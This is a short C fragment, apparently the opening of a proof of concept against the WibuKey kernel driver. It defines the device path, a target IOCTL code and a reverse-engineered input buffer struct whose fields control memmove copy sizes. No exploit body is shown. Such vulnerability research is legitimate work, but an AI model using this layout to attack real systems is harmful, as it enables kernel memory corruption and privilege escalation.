#include <Windows.h>
#include <stdio.h>

#define WIBUKEY_DEVICE "\\\\.\\GLOBALROOT\\Device\\WibuKey"
#define TARGET_IOCTL 0x8200E804

int main(int argc, char** argv);

typedef struct _INPUT_BUFFER
{
	unsigned short Padding1;				// Offset: +0x0 (0)
	unsigned short OutputBufferLength;		// Offset: +0x2 (2)
	unsigned short ComparedMemmoveCopySize1;// Offset: +0x4 (4)
	unsigned char JumpTableCode;			// Offset: +0x6 (6)
	unsigned char Padding2;					// Offset: +0x7 (7)
	unsigned int UnknownParameter1;			// Offset: +0x8 (8)
	unsigned int UnknownParameter2;			// Offset: +0xC (12)
	unsigned int MemmoveCopySize;			// Offset: +0x10 (16)
	unsigned int ComparedMemmoveCopySize2;	// Offset: +0x14 (20)
} INPUT_BUFFER, *PINPUT_BUFFER;